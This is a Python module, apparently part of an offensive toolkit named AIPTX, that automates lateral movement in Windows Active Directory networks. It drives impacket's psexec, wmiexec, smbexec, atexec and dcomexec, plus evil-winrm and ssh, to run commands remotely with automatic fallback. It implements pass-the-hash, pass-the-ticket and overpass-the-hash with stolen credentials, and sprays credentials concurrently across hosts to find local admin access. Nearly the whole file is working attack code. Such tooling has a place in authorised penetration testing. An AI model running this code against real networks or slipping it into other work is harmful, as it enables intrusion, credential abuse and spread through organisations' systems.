"""
AIPTX Active Directory Lateral Movement

Remote execution methods for Windows/AD environments:
- PsExec: SMB + Service creation
- WMIExec: WMI process creation
- SMBExec: SMB-only (no disk write)
- AtExec: Task Scheduler
- DCOMExec: DCOM objects (MMC20, ShellWindows)
- WinRM: Windows Remote Management
- SSH: OpenSSH if available
"""

from __future__ import annotations

import asyncio
import logging
import os
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Optional

logger = logging.getLogger(__name__)


class ExecMethod(Enum):
    """Remote execution methods"""

    PSEXEC = "psexec"
    WMIEXEC = "wmiexec"
    SMBEXEC = "smbexec"
    ATEXEC = "atexec"
    DCOMEXEC = "dcomexec"
    WINRM = "winrm"
    SSH = "ssh"


class AuthMethod(Enum):
    """Authentication methods"""

    PASSWORD = "password"
    NTLM_HASH = "ntlm_hash"  # Pass-the-Hash
    KERBEROS = "kerberos"  # Pass-the-Ticket
    AES_KEY = "aes_key"


@dataclass
class ExecResult:
    """Command execution result"""

    target: str
    method: ExecMethod
    command: str
    success: bool = False

    # Output
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1

    # Metadata
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None
    duration_seconds: float = 0.0
    error: str = ""

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "method": self.method.value,
            "command": self.command,
            "success": self.success,
            "stdout": self.stdout[:1000] if self.stdout else "",
            "stderr": self.stderr[:500] if self.stderr else "",
            "exit_code": self.exit_code,
            "duration_seconds": self.duration_seconds,
            "error": self.error,
        }


@dataclass
class ADLateralConfig:
    """Lateral movement configuration"""

    # Authentication
    username: Optional[str] = None
    password: Optional[str] = None
    ntlm_hash: Optional[str] = None
    aes_key: Optional[str] = None
    ticket_file: Optional[str] = None  # .ccache file
    domain: Optional[str] = None
    dc_ip: Optional[str] = None

    # Execution preferences
    preferred_method: ExecMethod = ExecMethod.WMIEXEC
    fallback_methods: list[ExecMethod] = field(
        default_factory=lambda: [
            ExecMethod.SMBEXEC,
            ExecMethod.PSEXEC,
            ExecMethod.ATEXEC,
        ]
    )

    # Options
    share: str = "C$"  # Share for file operations
    timeout: float = 60.0
    no_output: bool = False  # Don't wait for output


@dataclass
class SprayResult:
    """Password spray / local admin check result"""

    target: str
    username: str
    success: bool = False
    is_admin: bool = False
    method_used: str = ""
    error: str = ""

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "username": self.username,
            "success": self.success,
            "is_admin": self.is_admin,
            "method_used": self.method_used,
            "error": self.error,
        }


class ADLateralMovement:
    """
    Active Directory Lateral Movement.

    Provides multiple remote execution methods with automatic
    fallback and pass-the-hash/pass-the-ticket support.
    """

    def __init__(self, config: Optional[ADLateralConfig] = None):
        self.config = config or ADLateralConfig()

    # -------------------------------------------------------------------------
    # Unified Execution
    # -------------------------------------------------------------------------

    async def execute(
        self,
        target: str,
        command: str,
        method: Optional[ExecMethod] = None,
    ) -> ExecResult:
        """
        Execute command on remote host.

        Tries preferred method, falls back to alternatives.

        Args:
            target: Target IP/hostname
            command: Command to execute
            method: Specific method (or use preferred)

        Returns:
            ExecResult with output
        """
        methods = (
            [method] if method else [self.config.preferred_method] + self.config.fallback_methods
        )

        for exec_method in methods:
            try:
                result = await self._execute_method(target, command, exec_method)
                if result.success:
                    return result
            except Exception as e:
                logger.debug(f"{exec_method.value} failed on {target}: {e}")
                continue

        # All methods failed
        return ExecResult(
            target=target,
            method=methods[0] if methods else ExecMethod.WMIEXEC,
            command=command,
            success=False,
            error="All execution methods failed",
        )

    async def _execute_method(
        self,
        target: str,
        command: str,
        method: ExecMethod,
    ) -> ExecResult:
        """Execute using specific method"""
        result = ExecResult(
            target=target,
            method=method,
            command=command,
        )
        result.start_time = datetime.utcnow()

        try:
            if method == ExecMethod.PSEXEC:
                output = await self._psexec(target, command)
            elif method == ExecMethod.WMIEXEC:
                output = await self._wmiexec(target, command)
            elif method == ExecMethod.SMBEXEC:
                output = await self._smbexec(target, command)
            elif method == ExecMethod.ATEXEC:
                output = await self._atexec(target, command)
            elif method == ExecMethod.DCOMEXEC:
                output = await self._dcomexec(target, command)
            elif method == ExecMethod.WINRM:
                output = await self._winrm(target, command)
            elif method == ExecMethod.SSH:
                output = await self._ssh(target, command)
            else:
                raise ValueError(f"Unknown method: {method}")

            result.stdout = output
            result.success = True
            result.exit_code = 0

        except Exception as e:
            result.error = str(e)
            result.success = False

        result.end_time = datetime.utcnow()
        if result.start_time:
            result.duration_seconds = (result.end_time - result.start_time).total_seconds()

        return result

    # -------------------------------------------------------------------------
    # Impacket Methods
    # -------------------------------------------------------------------------

    def _build_impacket_auth(self) -> list[str]:
        """Build authentication arguments for impacket tools"""
        args = []

        target_str = ""
        if self.config.domain:
            target_str = f"{self.config.domain}/"

        if self.config.username:
            target_str += self.config.username

            if self.config.password:
                target_str += f":{self.config.password}"

        return [target_str] if target_str else []

    def _build_impacket_hash_args(self) -> list[str]:
        """Build hash authentication arguments"""
        if self.config.ntlm_hash:
            return ["-hashes", f":{self.config.ntlm_hash}"]
        elif self.config.aes_key:
            return ["-aesKey", self.config.aes_key]
        elif self.config.ticket_file:
            return ["-k", "-no-pass"]
        return []

    async def _psexec(self, target: str, command: str) -> str:
        """Execute via PsExec (impacket)"""
        cmd = ["psexec.py"]
        cmd.extend(self._build_impacket_auth())
        cmd.append(f"@{target}")
        cmd.extend(self._build_impacket_hash_args())

        if self.config.dc_ip:
            cmd.extend(["-dc-ip", self.config.dc_ip])

        cmd.append(command)

        return await self._run_impacket(cmd)

    async def _wmiexec(self, target: str, command: str) -> str:
        """Execute via WMI (impacket)"""
        cmd = ["wmiexec.py"]
        cmd.extend(self._build_impacket_auth())
        cmd.append(f"@{target}")
        cmd.extend(self._build_impacket_hash_args())

        if self.config.dc_ip:
            cmd.extend(["-dc-ip", self.config.dc_ip])

        if self.config.no_output:
            cmd.append("-nooutput")

        cmd.append(command)

        return await self._run_impacket(cmd)

    async def _smbexec(self, target: str, command: str) -> str:
        """Execute via SMBExec (impacket) - no disk write"""
        cmd = ["smbexec.py"]
        cmd.extend(self._build_impacket_auth())
        cmd.append(f"@{target}")
        cmd.extend(self._build_impacket_hash_args())

        if self.config.dc_ip:
            cmd.extend(["-dc-ip", self.config.dc_ip])

        cmd.append(command)

        return await self._run_impacket(cmd)

    async def _atexec(self, target: str, command: str) -> str:
        """Execute via Task Scheduler (impacket)"""
        cmd = ["atexec.py"]
        cmd.extend(self._build_impacket_auth())
        cmd.append(f"@{target}")
        cmd.extend(self._build_impacket_hash_args())

        if self.config.dc_ip:
            cmd.extend(["-dc-ip", self.config.dc_ip])

        cmd.append(command)

        return await self._run_impacket(cmd)

    async def _dcomexec(self, target: str, command: str) -> str:
        """Execute via DCOM (impacket)"""
        cmd = ["dcomexec.py"]
        cmd.extend(self._build_impacket_auth())
        cmd.append(f"@{target}")
        cmd.extend(self._build_impacket_hash_args())

        if self.config.dc_ip:
            cmd.extend(["-dc-ip", self.config.dc_ip])

        # Use MMC20 by default
        cmd.extend(["-object", "MMC20"])
        cmd.append(command)

        return await self._run_impacket(cmd)

    async def _run_impacket(self, cmd: list[str]) -> str:
        """Run impacket command"""
        # Set environment for Kerberos if using ticket
        env = os.environ.copy()
        if self.config.ticket_file:
            env["KRB5CCNAME"] = self.config.ticket_file

        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=env
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=self.config.timeout)

        output = stdout.decode()

        # Check for errors
        if proc.returncode != 0:
            error_output = stderr.decode()
            if "ACCESS_DENIED" in error_output or "STATUS_ACCESS_DENIED" in error_output:
                raise PermissionError("Access denied")
            elif "STATUS_LOGON_FAILURE" in error_output:
                raise PermissionError("Logon failure - bad credentials")
            elif error_output:
                raise RuntimeError(error_output)

        return output

    # -------------------------------------------------------------------------
    # WinRM
    # -------------------------------------------------------------------------

    async def _winrm(self, target: str, command: str) -> str:
        """Execute via WinRM"""
        try:
            # Try evil-winrm first
            return await self._evil_winrm(target, command)
        except FileNotFoundError:
            # Fallback to pywinrm
            return await self._pywinrm(target, command)

    async def _evil_winrm(self, target: str, command: str) -> str:
        """Execute via evil-winrm"""
        cmd = ["evil-winrm"]
        cmd.extend(["-i", target])

        if self.config.username:
            cmd.extend(["-u", self.config.username])

        if self.config.password:
            cmd.extend(["-p", self.config.password])
        elif self.config.ntlm_hash:
            cmd.extend(["-H", self.config.ntlm_hash])

        cmd.extend(["-c", command])

        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=self.config.timeout)

        return stdout.decode()

    async def _pywinrm(self, target: str, command: str) -> str:
        """Execute via pywinrm library"""
        try:
            import winrm

            # Determine auth method
            if self.config.ntlm_hash:
                # WinRM doesn't directly support hash auth
                # Would need to use Kerberos ticket instead
                raise ValueError("WinRM doesn't support direct hash auth, use Kerberos")

            session = winrm.Session(
                target,
                auth=(
                    (
                        f"{self.config.domain}\\{self.config.username}"
                        if self.config.domain
                        else self.config.username
                    ),
                    self.config.password,
                ),
                transport="ntlm",
            )

            result = session.run_cmd(command)
            return result.std_out.decode()

        except ImportError:
            raise FileNotFoundError("pywinrm not installed")

    # -------------------------------------------------------------------------
    # SSH
    # -------------------------------------------------------------------------

    async def _ssh(self, target: str, command: str) -> str:
        """Execute via SSH (if OpenSSH is installed on Windows)"""
        cmd = ["ssh"]
        cmd.extend(["-o", "StrictHostKeyChecking=no"])
        cmd.extend(["-o", "UserKnownHostsFile=/dev/null"])

        if self.config.username:
            cmd.append(f"{self.config.username}@{target}")
        else:
            cmd.append(target)

        cmd.append(command)

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            stdin=asyncio.subprocess.PIPE,
        )

        # If password auth, we need to handle it
        if self.config.password:
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=f"{self.config.password}\n".encode()),
                timeout=self.config.timeout,
            )
        else:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=self.config.timeout)

        return stdout.decode()

    # -------------------------------------------------------------------------
    # Pass-the-Hash / Pass-the-Ticket
    # -------------------------------------------------------------------------

    async def pass_the_hash(
        self,
        target: str,
        command: str,
        ntlm_hash: str,
    ) -> ExecResult:
        """
        Execute command using pass-the-hash.

        Args:
            target: Target host
            command: Command to execute
            ntlm_hash: NTLM hash (just NT hash or LM:NT)

        Returns:
            ExecResult
        """
        # Ensure hash is in correct format
        if ":" not in ntlm_hash:
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"

        original_hash = self.config.ntlm_hash
        self.config.ntlm_hash = ntlm_hash

        result = await self.execute(target, command)

        self.config.ntlm_hash = original_hash
        return result

    async def pass_the_ticket(
        self,
        target: str,
        command: str,
        ticket_file: str,
    ) -> ExecResult:
        """
        Execute command using pass-the-ticket.

        Args:
            target: Target host
            command: Command to execute
            ticket_file: Path to .ccache file

        Returns:
            ExecResult
        """
        original_ticket = self.config.ticket_file
        self.config.ticket_file = ticket_file

        result = await self.execute(target, command)

        self.config.ticket_file = original_ticket
        return result

    async def overpass_the_hash(
        self,
        ntlm_hash: str,
    ) -> Optional[str]:
        """
        Convert NTLM hash to Kerberos TGT.

        Args:
            ntlm_hash: NTLM hash

        Returns:
            Path to .ccache file or None
        """
        try:
            import tempfile

            ccache_file = tempfile.mktemp(suffix=".ccache")

            cmd = ["getTGT.py"]
            cmd.append(f"{self.config.domain}/{self.config.username}")
            cmd.extend(["-hashes", f":{ntlm_hash}"])

            if self.config.dc_ip:
                cmd.extend(["-dc-ip", self.config.dc_ip])

            env = os.environ.copy()
            env["KRB5CCNAME"] = ccache_file

            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=env
            )
            await asyncio.wait_for(proc.communicate(), timeout=self.config.timeout)

            if os.path.exists(ccache_file):
                return ccache_file

            return None

        except Exception as e:
            logger.error(f"Overpass-the-hash failed: {e}")
            return None

    # -------------------------------------------------------------------------
    # Credential Spray
    # -------------------------------------------------------------------------

    async def check_local_admin(
        self,
        target: str,
    ) -> SprayResult:
        """
        Check if current credentials have local admin on target.

        Args:
            target: Target host

        Returns:
            SprayResult indicating admin status
        """
        result = SprayResult(
            target=target,
            username=self.config.username or "",
        )

        try:
            # Try to list C$ share - requires admin
            exec_result = await self.execute(target, "hostname", method=ExecMethod.WMIEXEC)

            result.success = exec_result.success
            result.is_admin = exec_result.success
            result.method_used = exec_result.method.value

        except PermissionError:
            result.success = True  # Auth worked
            result.is_admin = False
            result.error = "Not admin"
        except Exception as e:
            result.error = str(e)

        return result

    async def spray_local_admin(
        self,
        targets: list[str],
        concurrency: int = 10,
    ) -> list[SprayResult]:
        """
        Check local admin access across multiple hosts.

        Args:
            targets: List of target hosts
            concurrency: Max concurrent checks

        Returns:
            List of SprayResult
        """
        results = []
        semaphore = asyncio.Semaphore(concurrency)

        async def check_with_limit(target: str) -> SprayResult:
            async with semaphore:
                return await self.check_local_admin(target)

        tasks = [check_with_limit(t) for t in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        return [r for r in results if isinstance(r, SprayResult)]


# Convenience functions
async def execute_remote(
    target: str,
    command: str,
    username: str,
    password: Optional[str] = None,
    ntlm_hash: Optional[str] = None,
    domain: Optional[str] = None,
    method: ExecMethod = ExecMethod.WMIEXEC,
) -> ExecResult:
    """
    Execute command on remote host.

    Args:
        target: Target IP/hostname
        command: Command to execute
        username: Username
        password: Password
        ntlm_hash: NTLM hash
        domain: Domain
        method: Execution method

    Returns:
        ExecResult
    """
    config = ADLateralConfig(
        username=username,
        password=password,
        ntlm_hash=ntlm_hash,
        domain=domain,
        preferred_method=method,
    )
    lateral = ADLateralMovement(config)
    return await lateral.execute(target, command, method)


async def find_local_admin_access(
    targets: list[str],
    username: str,
    password: Optional[str] = None,
    ntlm_hash: Optional[str] = None,
    domain: Optional[str] = None,
) -> list[str]:
    """
    Find hosts where credentials have local admin.

    Args:
        targets: List of targets
        username: Username
        password: Password
        ntlm_hash: NTLM hash
        domain: Domain

    Returns:
        List of hosts with admin access
    """
    config = ADLateralConfig(
        username=username,
        password=password,
        ntlm_hash=ntlm_hash,
        domain=domain,
    )
    lateral = ADLateralMovement(config)
    results = await lateral.spray_local_admin(targets)

    return [r.target for r in results if r.is_admin]
